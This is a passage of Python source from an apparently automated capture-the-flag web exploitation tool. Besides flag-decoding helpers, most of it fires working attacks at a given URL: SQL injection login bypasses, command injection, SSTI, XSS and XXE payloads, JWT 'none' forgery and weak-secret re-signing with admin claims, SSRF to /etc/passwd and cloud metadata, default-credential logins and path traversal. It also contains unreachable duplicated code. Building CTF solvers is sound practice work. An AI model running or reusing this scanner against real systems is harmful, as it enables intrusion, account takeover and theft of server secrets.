                        result.add_log(f"Found flag in obfuscated array: {flag}")
                        return flag
                flag = self.extract_flag(s)
                if flag:
                    return flag
        
        return None
    
    def _find_and_decode_strings(self, js_content: str, result: ChallengeResult) -> str:
        """Find and decode any encoded strings in JS - enhanced with Base64 hashing detection"""
        # PRIORITY 1: Look for Base64 encoded hashes (MD5, SHA1, SHA256)
        # Pattern: Base64(hash) where hash might be hex or binary
        b64_hash_pattern = r'[\'"]([A-Za-z0-9+/]{32,88}={0,2})[\'"]'
        for match in re.findall(b64_hash_pattern, js_content):
            if self._is_decoy_flag(match, js_content):
                continue
            
            try:
                decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                if decoded:
                    # Check if decoded is a hash (32 hex = MD5, 40 = SHA1, 64 = SHA256)
                    if re.match(r'^[a-f0-9]{32}$', decoded.lower()):
                        result.add_log(f"Found Base64 encoded MD5 hash: {decoded}")
                        cracked = CTFDecoder.crack_hash(decoded, 'md5')
                        if cracked:
                            result.add_log(f"Cracked Base64-MD5: {cracked}")
                            return cracked
                    elif re.match(r'^[a-f0-9]{40}$', decoded.lower()):
                        result.add_log(f"Found Base64 encoded SHA1 hash: {decoded}")
                        cracked = CTFDecoder.crack_hash(decoded, 'sha1')
                        if cracked:
                            return cracked
                    elif re.match(r'^[a-f0-9]{64}$', decoded.lower()):
                        result.add_log(f"Found Base64 encoded SHA256 hash: {decoded}")
                        cracked = CTFDecoder.crack_hash(decoded, 'sha256')
                        if cracked:
                            return cracked
                    
                    # Check if it's a flag or readable text
                    flag = self.extract_flag(decoded)
                    if flag and not self._is_decoy_flag(flag, js_content):
                        result.add_log(f"Found Base64 encoded flag")
                        return flag
                    if CTFDecoder._looks_english(decoded) and not self._is_decoy_flag(decoded, js_content):
                        result.add_log(f"Decoded Base64: {decoded}")
                        return decoded
            except:
                pass
        
        # Look for base64-like strings
        b64_pattern = r'[\'"]([A-Za-z0-9+/]{20,}={0,2})[\'"]'
        for match in re.findall(b64_pattern, js_content):
            # Skip if it's in a decoy context
            if self._is_decoy_flag(match, js_content):
                result.add_log(f"Skipping decoy base64: {match[:30]}...")
                continue
            
            decoded = CTFDecoder.decode_base64(match)
            if decoded:
                # Skip decoded decoys
                if self._is_decoy_flag(decoded, js_content):
                    result.add_log(f"Skipping decoded decoy: {decoded[:30]}...")
                    continue
                
                flag = self.extract_flag(decoded)
                if flag and not self._is_decoy_flag(flag, js_content):
                    result.add_log(f"Found base64 encoded flag")
                    return flag
                if CTFDecoder._looks_english(decoded) and not self._is_decoy_flag(decoded, js_content):
                    result.add_log(f"Decoded base64: {decoded}")
                    return decoded
        
        # Look for hex strings
        hex_pattern = r'[\'"]([0-9a-fA-F]{20,})[\'"]'
        for match in re.findall(hex_pattern, js_content):
            decoded = CTFDecoder.decode_hex(match)
            if decoded:
                if self._is_decoy_flag(decoded, js_content):
                    continue
                flag = self.extract_flag(decoded)
                if flag and not self._is_decoy_flag(flag, js_content):
                    result.add_log(f"Found hex encoded flag")
                    return flag
                if CTFDecoder._looks_english(decoded) and not self._is_decoy_flag(decoded, js_content):
                    result.add_log(f"Decoded hex: {decoded}")
                    return decoded
        
        # Look for binary strings
        binary_pattern = r'[\'"]([01\s]{16,})[\'"]'
        for match in re.findall(binary_pattern, js_content):
            decoded = CTFDecoder.decode_binary(match)
            if decoded:
                if self._is_decoy_flag(decoded, js_content):
                    continue
                flag = self.extract_flag(decoded)
                if flag and not self._is_decoy_flag(flag, js_content):
                    result.add_log(f"Found binary encoded flag")
                    return flag
                if CTFDecoder._looks_english(decoded) and not self._is_decoy_flag(decoded, js_content):
                    result.add_log(f"Decoded binary: {decoded}")
                    return decoded
        
        # Look for ROT13 encoded strings
        rot13_candidates = re.findall(r'[\'"]([A-Za-z]{10,})[\'"]', js_content)
        for candidate in rot13_candidates:
            decoded = CTFDecoder.decode_rot13(candidate)
            if decoded:
                flag = self.extract_flag(decoded)
                if flag and not self._is_decoy_flag(flag, js_content):
                    result.add_log(f"Found ROT13 encoded flag")
                    return flag
        
        # Look for reversed strings
        reverse_candidates = re.findall(r'[\'"]([^\'"]{10,})[\'"]', js_content)
        for candidate in reverse_candidates:
            reversed_str = candidate[::-1]
            flag = self.extract_flag(reversed_str)
            if flag and not self._is_decoy_flag(flag, js_content):
                result.add_log(f"Found reversed flag")
                return flag
        
        # Look for XOR encoded strings with common keys
        xor_pattern = r'[\'"]([A-Za-z0-9+/=]{10,})[\'"]'
        for match in re.findall(xor_pattern, js_content):
            # Try common XOR keys
            for key in [0x20, 0x41, 0x42, 0x55, 0xAA, 0xFF]:
                try:
                    decoded = ''.join(chr(ord(c) ^ key) for c in match)
                    flag = self.extract_flag(decoded)
                    if flag and not self._is_decoy_flag(flag, js_content):
                        result.add_log(f"Found XOR encoded flag (key: {hex(key)})")
                        return flag
                except:
                    pass
        
        # Look for atbash cipher - but only for longer, meaningful strings
        atbash_candidates = re.findall(r'[\'"]([A-Za-z\s]{15,})[\'"]', js_content)
        for candidate in atbash_candidates:
            # Skip if candidate is too short or looks like common code
            if len(candidate) < 15:
                continue
            # Skip common JS/CSS keywords
            if candidate.lower() in ['true', 'false', 'null', 'undefined', 'function', 'return']:
                continue
            decoded = CTFDecoder.decode_atbash(candidate)
            if decoded:
                # Skip if decoded is a simple/common value
                if self._is_decoy_flag(decoded, js_content):
                    continue
                flag = self.extract_flag(decoded)
                if flag and not self._is_decoy_flag(flag, js_content):
                    result.add_log(f"Found Atbash encoded flag")
                    return flag
        
        return None
    
    def _detect_caesar_cipher(self, js_content: str, result: ChallengeResult) -> str:
        """Detect and decode Caesar cipher from JS variables"""
        
        # PATTERN 1: Look for cipher config with shift value (like melodiousdesk)
        # e.g., cipherConfig = { algorithm: "caesar", shift: 4 }
        config_patterns = [
            r'(?:cipher|encryption|security)Config\s*=\s*\{[^}]*shift\s*:\s*(\d+)',
            r'(?:cipher|encryption|security)Config\s*=\s*\{[^}]*key\s*:\s*(\d+)',
            r'(?:cipher|encryption|security)Config\s*=\s*\{[^}]*offset\s*:\s*(\d+)',
            r'encryptionParams\s*=\s*\{[^}]*offset\s*:\s*(\d+)',
        ]
        
        shift_from_config = None
        for pattern in config_patterns:
            match = re.search(pattern, js_content, re.IGNORECASE | re.DOTALL)
            if match:
                shift_from_config = int(match.group(1))
                result.add_log(f"Found cipher config with shift: {shift_from_config}")
                break
        
        # Also check for version hints (v4 = shift 4, version: "v4.0.1" = shift 4)
        if not shift_from_config:
            version_patterns = [
                r'version["\']?\s*:\s*["\']v(\d+)',
                r'protocol["\']?\s*:\s*["\']v(\d+)',
                r'ACCESS\s+TERMINAL\s+v(\d+)',
                r'title["\']?\s*:\s*["\'][^"\']*v(\d+)',
            ]
            for pattern in version_patterns:
                match = re.search(pattern, js_content, re.IGNORECASE)
                if match:
                    shift_from_config = int(match.group(1))
                    result.add_log(f"Found version hint suggesting shift: {shift_from_config}")
                    break
        
        # PATTERN 2: Look for encrypted data variables (like melodiousdesk cipher files)
        # e.g., const encryptedData1 = "jmjxl jpssv jmzi divs wmb";
        encrypted_var_patterns = [
            r'(?:const|let|var)\s+(?:encrypted|cipher|secret|transmission|message|data)(?:Data|Text|Message|Block)?\d*\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'(?:const|let|var)\s+(?:encoded|obfuscated|hidden)\d*\s*=\s*[\'"]([^\'"]+)[\'"]',
        ]
        
        cipher_texts = []
        for pattern in encrypted_var_patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                # Skip if it looks like code or HTML
                if '<' in match or '>' in match or '{' in match or '}' in match:
                    continue
                if len(match) > 5 and match not in cipher_texts:
                    cipher_texts.append(match)
        
        # Try to decode found cipher texts
        if cipher_texts and shift_from_config:
            # Use the first unique cipher text
            cipher_text = cipher_texts[0]
            result.add_log(f"Found cipher text: {cipher_text}")
            decoded = self._caesar_decode(cipher_text, shift_from_config)
            result.add_log(f"Caesar decoded (shift {shift_from_config}): {decoded}")
            if self._looks_like_english(decoded):
                return decoded
        
        # If no config shift, try all shifts on cipher texts
        if cipher_texts and not shift_from_config:
            for cipher_text in cipher_texts[:3]:  # Try first 3
                result.add_log(f"Trying to decode: {cipher_text[:50]}...")
                for test_shift in range(1, 26):
                    decoded = self._caesar_decode(cipher_text, test_shift)
                    if self._looks_like_english(decoded):
                        result.add_log(f"Caesar decoded (shift {test_shift}): {decoded}")
                        return decoded
        
        # PATTERN 3: Look for part1, part2, etc. patterns
        part_pattern = r'(?:const|let|var)\s+part(\d+)\s*=\s*[\'"]([^\'"]+)[\'"]'
        parts = re.findall(part_pattern, js_content, re.IGNORECASE)
        
        if len(parts) >= 3:
            # Sort by part number and combine
            parts.sort(key=lambda x: int(x[0]))
            combined = ' '.join([p[1] for p in parts])
            result.add_log(f"Found Caesar cipher parts: {combined}")
            
            shift = shift_from_config
            if not shift:
                # Look for shift value in the code
                shift_pattern = r'shift[:\s]*(\d+)'
                shift_match = re.search(shift_pattern, js_content, re.IGNORECASE)
                shift = int(shift_match.group(1)) if shift_match else None
            
            if shift:
                decoded = self._caesar_decode(combined, shift)
                result.add_log(f"Caesar decoded (shift {shift}): {decoded}")
                return decoded
            else:
                # Try common shifts
                for test_shift in range(1, 26):
                    decoded = self._caesar_decode(combined, test_shift)
                    if self._looks_like_english(decoded):
                        result.add_log(f"Caesar decoded (shift {test_shift}): {decoded}")
                        return decoded
        
        # Look for hiddenData object with payload and shift
        hidden_data_pattern = r'hiddenData\s*:\s*\{[^}]*payload\s*:\s*[\'"]([^\'"]+)[\'"][^}]*shift\s*:\s*(\d+)'
        match = re.search(hidden_data_pattern, js_content, re.IGNORECASE | re.DOTALL)
        if match:
            payload = match.group(1)
            shift = int(match.group(2))
            result.add_log(f"Found hiddenData payload: {payload[:50]}... (shift {shift})")
            decoded = self._caesar_decode(payload, shift)
            if self._looks_like_english(decoded):
                result.add_log(f"Caesar decoded: {decoded}")
                return decoded
        
        # Also try reverse order (shift before payload)
        hidden_data_pattern2 = r'hiddenData\s*:\s*\{[^}]*shift\s*:\s*(\d+)[^}]*payload\s*:\s*[\'"]([^\'"]+)[\'"]'
        match = re.search(hidden_data_pattern2, js_content, re.IGNORECASE | re.DOTALL)
        if match:
            shift = int(match.group(1))
            payload = match.group(2)
            result.add_log(f"Found hiddenData payload: {payload[:50]}... (shift {shift})")
            decoded = self._caesar_decode(payload, shift)
            if self._looks_like_english(decoded):
                result.add_log(f"Caesar decoded: {decoded}")
                return decoded
        
        # Look for encoded/payload variables
        encoded_patterns = [
            r'(?:const|let|var)\s+(?:encoded|payload|cipher|encrypted)\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'(?:const|let|var)\s+(?:encoded|payload|cipher|encrypted)\s*=\s*\[([^\]]+)\]\.join',
        ]
        
        for pattern in encoded_patterns:
            match = re.search(pattern, js_content, re.IGNORECASE)
            if match:
                encoded_text = match.group(1)
                result.add_log(f"Found encoded text: {encoded_text[:50]}...")
                
                # Look for shift value
                shift = shift_from_config
                if not shift:
                    shift_match = re.search(r'shift[:\s]*(\d+)', js_content, re.IGNORECASE)
                    if shift_match:
                        shift = int(shift_match.group(1))
                
                if shift:
                    decoded = self._caesar_decode(encoded_text, shift)
                    result.add_log(f"Caesar decoded: {decoded}")
                    return decoded
        
        return None
    
    def _caesar_decode(self, text: str, shift: int) -> str:
        """Decode Caesar cipher with given shift"""
        result = ''
        for ch in text:
            if ch.isalpha():
                base = ord('A') if ch.isupper() else ord('a')
                result += chr((ord(ch) - base - shift) % 26 + base)
            else:
                result += ch
        return result
    
    def _looks_like_english(self, text: str) -> bool:
        """Check if text looks like English words"""
        common_words = ['the', 'and', 'for', 'are', 'but', 'not', 'you', 'all', 'can', 'had',
                       'her', 'was', 'one', 'our', 'out', 'day', 'get', 'has', 'him', 'his',
                       'how', 'its', 'may', 'new', 'now', 'old', 'see', 'two', 'way', 'who',
                       'boy', 'did', 'own', 'say', 'she', 'too', 'use', 'in', 'of', 'to',
                       'ball', 'court', 'front', 'basket', 'flag', 'key', 'secret', 'hidden',
                       'floor', 'five', 'zero', 'six', 'room', 'door', 'meet', 'place',
                       'first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh',
                       'hello', 'world', 'test', 'admin', 'user', 'pass', 'password',
                       'mission', 'exploit', 'hack', 'code', 'data', 'file', 'system']
        text_lower = text.lower()
        words = text_lower.split()
        matches = sum(1 for word in words if word in common_words)
        return matches >= 2 or any(word in text_lower for word in ['flag', 'key', 'secret', 'ball', 'court', 'front', 'basket', 'floor', 'five', 'zero', 'six'])
    
    def _decode_morse(self, morse: str) -> str:
        """Decode Morse code to text"""
        MORSE_TO_CHAR = {
            '.-': 'a', '-...': 'b', '-.-.': 'c', '-..': 'd', '.': 'e',
            '..-.': 'f', '--.': 'g', '....': 'h', '..': 'i', '.---': 'j',
            '-.-': 'k', '.-..': 'l', '--': 'm', '-.': 'n', '---': 'o',
            '.--.': 'p', '--.-': 'q', '.-.': 'r', '...': 's', '-': 't',
            '..-': 'u', '...-': 'v', '.--': 'w', '-..-': 'x', '-.--': 'y',
            '--..': 'z', '-----': '0', '.----': '1', '..---': '2',
            '...--': '3', '....-': '4', '.....': '5', '-....': '6',
            '--...': '7', '---..': '8', '----.': '9', '/': ' ',
            '-.--.': '(', '-.--.-': ')', '.-.-.-': '.', '--..--': ',',
        }
        
        try:
            words = morse.split(' / ')
            decoded_words = []
            for word in words:
                letters = word.strip().split(' ')
                decoded_word = ''
                for letter in letters:
                    letter = letter.strip()
                    if letter in MORSE_TO_CHAR:
                        decoded_word += MORSE_TO_CHAR[letter]
                if decoded_word:
                    decoded_words.append(decoded_word)
            
            if decoded_words:
                return ' '.join(decoded_words)
        except:
            pass
        
        return None
        """Decode Morse code to text"""
        MORSE_TO_CHAR = {
            '.-': 'a', '-...': 'b', '-.-.': 'c', '-..': 'd', '.': 'e',
            '..-.': 'f', '--.': 'g', '....': 'h', '..': 'i', '.---': 'j',
            '-.-': 'k', '.-..': 'l', '--': 'm', '-.': 'n', '---': 'o',
            '.--.': 'p', '--.-': 'q', '.-.': 'r', '...': 's', '-': 't',
            '..-': 'u', '...-': 'v', '.--': 'w', '-..-': 'x', '-.--': 'y',
            '--..': 'z', '-----': '0', '.----': '1', '..---': '2',
            '...--': '3', '....-': '4', '.....': '5', '-....': '6',
            '--...': '7', '---..': '8', '----.': '9', '/': ' ',
            '-.--.': '(', '-.--.-': ')', '.-.-.-': '.', '--..--': ',',
        }
        
        try:
            words = morse.split(' / ')
            decoded_words = []
            for word in words:
                letters = word.strip().split(' ')
                decoded_word = ''
                for letter in letters:
                    letter = letter.strip()
                    if letter in MORSE_TO_CHAR:
                        decoded_word += MORSE_TO_CHAR[letter]
                if decoded_word:
                    decoded_words.append(decoded_word)
            
            if decoded_words:
                return ' '.join(decoded_words)
        except:
            pass
        
        return None
    
    def _check_robots_sitemap(self, url: str, result: ChallengeResult) -> str:
        """Check robots.txt and sitemap.xml"""
        result.add_log("Checking robots.txt and sitemap...")
        base_url = url.rstrip('/')
        
        files_to_check = ['/robots.txt', '/sitemap.xml', '/sitemap.txt']
        discovered_paths = []
        
        for file in files_to_check:
            try:
                response = self.session.get(urljoin(base_url, file), timeout=self.timeout)
                if response.status_code == 200:
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Found flag in {file}")
                        return flag
                    
                    # Check for interesting paths in robots.txt
                    if 'robots.txt' in file:
                        for line in response.text.split('\n'):
                            if 'Disallow:' in line or 'Allow:' in line:
                                path = line.split(':')[1].strip()
                                if path and path != '/':
                                    discovered_paths.append(path)
                                    try:
                                        path_response = self.session.get(urljoin(base_url, path), timeout=self.timeout)
                                        flag = self.extract_flag(path_response.text)
                                        if flag:
                                            result.add_log(f"Found flag at {path}")
                                            return flag
                                    except:
                                        pass
            except:
                pass
        
        # Try combining discovered paths with common file names (like /download + /goal.txt)
        common_files = ['goal.txt', 'flag.txt', 'secret.txt', 'key.txt', 'index.html', 'data.txt']
        for path in discovered_paths:
            path = path.rstrip('/')
            for filename in common_files:
                try:
                    combined_path = f"{path}/{filename}"
                    combined_response = self.session.get(urljoin(base_url, combined_path), timeout=self.timeout)
                    if combined_response.status_code == 200:
                        flag = self.extract_flag(combined_response.text)
                        if flag:
                            result.add_log(f"Found flag at {combined_path}")
                            return flag
                except:
                    pass
        
        return None
    
    def _test_sql_injection(self, url: str, result: ChallengeResult) -> str:
        """Test for SQL injection vulnerabilities - all types"""
        result.add_log("Testing SQL injection (union, boolean, time-based, error-based)...")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Test each parameter
        for param_name in params:
            for sqli_type, payloads in self.SQLI_PAYLOADS.items():
                for payload in payloads:
                    try:
                        # GET request
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=self.timeout)
                        elapsed = time.time() - start_time
                        
                        # Check for time-based SQLi
                        if sqli_type == 'time' and elapsed > 4:
                            result.add_log(f"Time-based SQLi detected on {param_name}")
                        
                        # Check for flag in response
                        flag = self.extract_flag(response.text)
                        if flag:
                            result.add_log(f"SQLi ({sqli_type}) successful on {param_name}")
                            return flag
                        
                        # Check for SQL errors (error-based)
                        sql_errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error', 'query']
                        if any(err in response.text.lower() for err in sql_errors):
                            result.add_log(f"SQL error detected on {param_name}")
                    except:
                        pass
        
        # Test POST parameters
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(url, action) if action else url
                
                inputs = form.find_all(['input', 'textarea'])
                for inp in inputs:
                    inp_name = inp.get('name')
                    if not inp_name:
                        continue
                    
                    for sqli_type, payloads in self.SQLI_PAYLOADS.items():
                        for payload in payloads[:3]:  # Limit payloads per input
                            try:
                                data = {inp_name: payload}
                                if method == 'post':
                                    resp = self.session.post(form_url, data=data, timeout=self.timeout)
                                else:
                                    resp = self.session.get(form_url, params=data, timeout=self.timeout)
                                
                                flag = self.extract_flag(resp.text)
                                if flag:
                                    result.add_log(f"SQLi on form input {inp_name}")
                                    return flag
                            except:
                                pass
        except:
            pass
        
        # Test JSON API endpoints (for modern login forms)
        flag = self._test_json_api_sqli(url, result)
        if flag:
            return flag
        
        return None
    
    def _test_json_api_sqli(self, url: str, result: ChallengeResult) -> str:
        """Test SQL injection on JSON API endpoints (modern login forms) - optimized"""
        result.add_log("Testing JSON API SQL injection...")
        
        base_url = url.rstrip('/')
        
        # Only test most common endpoints
        api_endpoints = ['/login', '/api/login']
        
        # Only test most effective payloads
        sqli_payloads = [
            "' OR '1'='1",
            "admin'--",
        ]
        
        # Only test most common field names
        field_combinations = [
            ('username', 'password'),
            ('email', 'password'),
        ]
        
        for endpoint in api_endpoints:
            api_url = base_url + endpoint
            
            for username_field, password_field in field_combinations:
                for payload in sqli_payloads:
                    try:
                        data = {
                            username_field: payload,
                            password_field: 'anything'
                        }
                        
                        response = self.session.post(
                            api_url,
                            json=data,
                            headers={'Content-Type': 'application/json'},
                            timeout=5  # Short timeout
                        )
                        
                        if response.status_code == 200:
                            try:
                                json_resp = response.json()
                                
                                if json_resp.get('success') or json_resp.get('authenticated'):
                                    result.add_log(f"SQLi successful on {endpoint}")
                                    
                                    flag = self.extract_flag(str(json_resp))
                                    if flag:
                                        return flag
                                    
                                    # Try dashboard
                                    for dash_url in ['/dashboard', '/dashboard.html']:
                                        try:
                                            dash_response = self.session.get(base_url + dash_url, timeout=5)
                                            if dash_response.status_code == 200:
                                                flag = self.extract_flag(dash_response.text)
                                                if flag:
                                                    return flag
                                        except:
                                            pass
                            except:
                                pass
                    except:
                        pass
        
        return None
        return None
    
    def _test_command_injection(self, url: str, result: ChallengeResult) -> str:
        """Test for command injection with bypass techniques"""
        result.add_log("Testing command injection...")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Test URL parameters
        for param_name in params:
            for payload in self.CMD_INJECTION_PAYLOADS:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Command injection successful on {param_name}")
                        return flag
                except:
                    pass
        
        # Test common parameter names
        common_params = ['cmd', 'command', 'exec', 'execute', 'ping', 'query', 'ip', 'host', 'file', 'path', 'dir']
        for param in common_params:
            for payload in self.CMD_INJECTION_PAYLOADS:
                try:
                    response = self.session.get(url, params={param: payload}, timeout=self.timeout)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Command injection on param {param}")
                        return flag
                except:
                    pass
        
        # Test POST
        for param in common_params:
            for payload in self.CMD_INJECTION_PAYLOADS[:5]:
                try:
                    response = self.session.post(url, data={param: payload}, timeout=self.timeout)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Command injection via POST on {param}")
                        return flag
                except:
                    pass
        
        return None
    
    def _test_ssti(self, url: str, result: ChallengeResult) -> str:
        """Test for Server-Side Template Injection"""
        result.add_log("Testing SSTI...")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in self.SSTI_PAYLOADS:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Check for SSTI indicators
                    if '49' in response.text and '{{7*7}}' in payload:
                        result.add_log(f"SSTI detected on {param_name}")
                    
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"SSTI exploitation successful")
                        return flag
                except:
                    pass
        
        # Test common parameters
        for param in ['name', 'template', 'page', 'view', 'content', 'message']:
            for payload in self.SSTI_PAYLOADS:
                try:
                    response = self.session.get(url, params={param: payload}, timeout=self.timeout)
                    flag = self.extract_flag(response.text)
                    if flag:
                        return flag
                except:
                    pass
        
        return None
    
    def _test_xss(self, url: str, result: ChallengeResult) -> str:
        """Test for XSS vulnerabilities"""
        result.add_log("Testing XSS...")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in self.XSS_PAYLOADS:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        result.add_log(f"XSS reflected on {param_name}")
                    
                    flag = self.extract_flag(response.text)
                    if flag:
                        return flag
                except:
                    pass
        
        return None
    
    def _test_xxe(self, url: str, result: ChallengeResult) -> str:
        """Test for XXE vulnerabilities"""
        result.add_log("Testing XXE...")
        
        for payload in self.XXE_PAYLOADS:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(url, data=payload, headers=headers, timeout=self.timeout)
                
                flag = self.extract_flag(response.text)
                if flag:
                    result.add_log("XXE exploitation successful")
                    return flag
            except:
                pass
        
        return None
    
    def _test_jwt_attacks(self, url: str, result: ChallengeResult) -> str:
        """Test for JWT vulnerabilities - enhanced with Base64 hashing detection"""
        result.add_log("Testing JWT attacks...")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Look for JWT in cookies
            for cookie in self.session.cookies:
                if self._is_jwt(cookie.value):
                    result.add_log(f"Found JWT in cookie: {cookie.name}")
                    
                    # Decode and analyze JWT
                    jwt_data = CTFDecoder.decode_jwt(cookie.value)
                    if jwt_data:
                        result.add_log(f"JWT Header: {jwt_data.get('header', {})}")
                        result.add_log(f"JWT Payload: {jwt_data.get('payload', {})}")
                        
                        # Check if payload contains flag or Base64 encoded data
                        payload = jwt_data.get('payload', {})
                        for key, value in payload.items():
                            if isinstance(value, str):
                                # Check for flag
                                flag = self.extract_flag(value)
                                if flag:
                                    result.add_log(f"Found flag in JWT payload: {key}")
                                    return flag
                                
                                # Try Base64 decode
                                try:
                                    decoded = base64.b64decode(value).decode('utf-8', errors='ignore')
                                    if decoded and len(decoded) >= 3:
                                        flag = self.extract_flag(decoded)
                                        if flag:
                                            result.add_log(f"Found Base64 encoded flag in JWT: {key}")
                                            return flag
                                        if CTFDecoder._looks_english(decoded):
                                            result.add_log(f"JWT Base64 decoded {key}: {decoded}")
                                            return decoded
                                except:
                                    pass
                    
                    # Try algorithm confusion (none)
                    modified_jwt = self._jwt_none_attack(cookie.value)
                    if modified_jwt:
                        self.session.cookies.set(cookie.name, modified_jwt)
                        resp = self.session.get(url, timeout=self.timeout)
                        flag = self.extract_flag(resp.text)
                        if flag:
                            result.add_log("JWT none algorithm attack successful")
                            return flag
                    
                    # Try weak secrets
                    for secret in self.JWT_WEAK_SECRETS:
                        try:
                            import jwt
                            decoded = jwt.decode(cookie.value, secret, algorithms=['HS256'])
                            result.add_log(f"JWT weak secret found: {secret}")
                            
                            # Modify payload and re-sign
                            decoded['admin'] = True
                            decoded['role'] = 'admin'
                            decoded['isAdmin'] = True
                            decoded['user'] = 'admin'
                            new_token = jwt.encode(decoded, secret, algorithm='HS256')
                            
                            self.session.cookies.set(cookie.name, new_token)
                            resp = self.session.get(url, timeout=self.timeout)
                            flag = self.extract_flag(resp.text)
                            if flag:
                                result.add_log(f"JWT weak secret attack successful with: {secret}")
                                return flag
                        except:
                            pass
            
            # Look for JWT in response body or headers
            jwt_patterns = [
                r'token["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*)["\']',
                r'jwt["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*)["\']',
                r'bearer\s+([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*)',
            ]
            
            for pattern in jwt_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                for token in matches:
                    if self._is_jwt(token):
                        result.add_log(f"Found JWT in response: {token[:50]}...")
                        jwt_data = CTFDecoder.decode_jwt(token)
                        if jwt_data:
                            payload = jwt_data.get('payload', {})
                            for key, value in payload.items():
                                if isinstance(value, str):
                                    flag = self.extract_flag(value)
                                    if flag:
                                        return flag
                                    # Try Base64 decode
                                    try:
                                        decoded = base64.b64decode(value).decode('utf-8', errors='ignore')
                                        if decoded and CTFDecoder._looks_english(decoded):
                                            return decoded
                                    except:
                                        pass
        except:
            pass
        
        return None
    
    def _is_jwt(self, token: str) -> bool:
        """Check if string is a JWT"""
        parts = token.split('.')
        if len(parts) != 3:
            return False
        try:
            base64.urlsafe_b64decode(parts[0] + '==')
            base64.urlsafe_b64decode(parts[1] + '==')
            return True
        except:
            return False
    
    def _jwt_none_attack(self, token: str) -> str:
        """Attempt JWT none algorithm attack"""
        try:
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            header['alg'] = 'none'
            payload['admin'] = True
            payload['role'] = 'admin'
            
            new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            return f"{new_header}.{new_payload}."
        except:
            return None
    
    def _test_ssrf(self, url: str, result: ChallengeResult) -> str:
        """Test for SSRF vulnerabilities"""
        result.add_log("Testing SSRF...")
        
        ssrf_payloads = [
            'http://127.0.0.1/flag.txt',
            'http://localhost/flag.txt',
            'http://127.0.0.1:80/flag.txt',
            'file:///flag.txt',
            'file:///etc/passwd',
            'http://169.254.169.254/latest/meta-data/',
            'http://[::1]/flag.txt',
            'http://0.0.0.0/flag.txt',
        ]
        
        params_to_test = ['url', 'uri', 'path', 'dest', 'redirect', 'target', 'link', 'fetch', 'site', 'html']
        
        for param in params_to_test:
            for payload in ssrf_payloads:
                try:
                    response = self.session.get(url, params={param: payload}, timeout=self.timeout)
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"SSRF successful on {param}")
                        return flag
                except:
                    pass
        
        return None
    
    def _test_auth_bypass(self, url: str, result: ChallengeResult) -> str:
        """Test for authentication bypass - quick version"""
        result.add_log("Testing authentication bypass...")
        
        # Only test most common admin paths in quick mode
        admin_paths = ['/admin', '/login']
        
        for path in admin_paths:
            try:
                admin_url = urljoin(url, path)
                
                # Try only most common credentials
                creds = [
                    ('admin', 'admin'), ('admin', 'password'),
                ]
                
                for username, password in creds:
                    response = self.session.post(admin_url, data={
                        'username': username, 'password': password,
                    }, timeout=5, allow_redirects=True)
                    
                    flag = self.extract_flag(response.text)
                    if flag:
                        result.add_log(f"Auth bypass with {username}:{password}")
                        return flag
            except:
                pass
        
        return None
    
    def _test_path_traversal(self, url: str, result: ChallengeResult) -> str:
        """Test for path traversal"""
        result.add_log("Testing path traversal...")
        
        traversal_payloads = [
            '../' * i + 'flag.txt' for i in range(1, 10)
        ] + [
            '..\\' * i + 'flag.txt' for i in range(1, 10)
        ] + [
            '....//....//flag.txt',
            '..%252f..%252fflag.txt',
            '%2e%2e%2fflag.txt',
            '..%c0%afflag.txt',
        ]
        
        params_to_test = ['file', 'path', 'page', 'document', 'folder', 'root', 'dir', 'download', 'read']
        
        for param in params_to_test:
            for payload in traversal_payloads:
                try:
